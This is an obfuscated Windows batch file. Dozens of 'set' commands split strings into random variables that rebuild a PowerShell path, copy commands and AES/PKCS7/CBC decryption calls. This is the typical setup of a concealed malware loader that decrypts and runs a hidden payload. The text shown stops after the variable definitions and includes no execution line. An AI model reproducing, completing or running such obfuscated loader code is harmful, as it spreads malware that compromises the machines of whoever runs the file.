@echo off
set "rFGNdWVBKA=rS"
set "DlVlSDffHo=ws"
set "aNSvjuyjiq=do"
set "fBeNeiPGnc=em"
set "YSbMhEYCWj=s\"
set "BBvYgPOPdG=\W"
set "SCpNZQtgxL=Sy"
set "msUvxalmAx=he"
set "IjYXjObhqU=py"
set "CdVAgvYZPo=xe"
set "hQNCeryBJR=in"
set "aQsuGBOHeV=nd"
set "VAScindQnb=co"
set "nwSGGhcZxI=po"
set "HielIAxiPt=st"
set "HMBenvQigE=:\"
set "UvCvCNIaPM=we"
set "PYxpyBBhYC=1."
set "VmZmuVITKN=ow"
set "JGoiQrbcsZ=y "
set "CwzrRamiqV=0\"
set "zCJqVgOYJV=ll"
set "UeqUXOtPDY=\v"
set "btLlXnsRQa= C"
set "BlyILtfQJr=he"
set "gkjwpLVMei=.e"
set "CmKUcsXmmD=32"
set "NwujpNuPBc=Wi"
set "FBAgBxEYdW=rs"
set "uaCGVLzhQL=Po"
set "UqsxwhIzIe=ll"
set "RdtHvcSkkv= /"
set "GwIBIWTcZU=we"
set "LSuEyVJXnT= %~dp0"
set "hsDFMYIaRi=cd"
set "LwRvwsKQPU=ptor"
set "iVXwrXKvjq=O) {"
set "BmkeTgsDNG=ZYYc"
set "EJpGflvpRa=Fo7l"
set "gYHIXbhRly== $o"
set "cKFbyPJQWI=n ''"
set "nXBhSGmlGw=();$"
set "ALvxVXJqIE=('l0"
set "vPschzgHEx=bWjU"
set "ZpwNaYgXNI=-4] "
set "ZXOmQEWqUY=ptog"
set "aHEpWvVppC=bWjU"
set "DUBVsuwAZs=Invo"
set "GlqoqtTQLt=em.C"
set "SCzFLWohjG=y.Pa"
set "uZcuYXwpBi=ck($"
set "PZlXPMSULv=PKCS"
set "NTPXjVzdUD=Kff."
set "tEoTlUnexO=gth)"
set "kgRCJAyCcP=);$o"
set "QxzmAGKfny=in $"
set "IJiezLPmNu=bWjU"
set "ExqXKUORMj=::De"
set "OLUQBxrlIa=Mi, "
set "hdBuDHvbYf=tsWi"
set "giKXdedFYv=join"
set "SieAkISknx=pose"
set "MRjGRKsuuB=)) {"
set "giVaAnNvfk=7;$o"
set "mTSRGmtyBd=ach "
set "WHfYSgBXPu=S46e"
set "rjiBFeJCqC=tS46"
set "AyfPfnJLuw=  $s"
set "NdjSXnETzj=TllA"
set "EwnWrwDAhL=ose("
set "zuhNkmbpka=iL);"
set "TWFkHgmcwJ=Mode"
set "VoWWBUzHTk=Star"
set "alrtaYfhWg=$xmw"
set "zrPPgtSDiu= '')"
set "sMwpKixRzA=comm"
set "pJwFdmlhGk=);$W"
set "WoqmyXsyEq=esFX"
set "lpbWyivAfv=BC;$"
set "IFNtaqcFWm= = ["
set "ndJDfehuDn=ptog"
set "xjlzWjNoZX=XsML"
set "OLsCKBTlKR=ing("
set "zCXTLxVrjy=ne);"
set "zkZwNqrOMe=obWj"
set "WDfWJDvbqp=null"
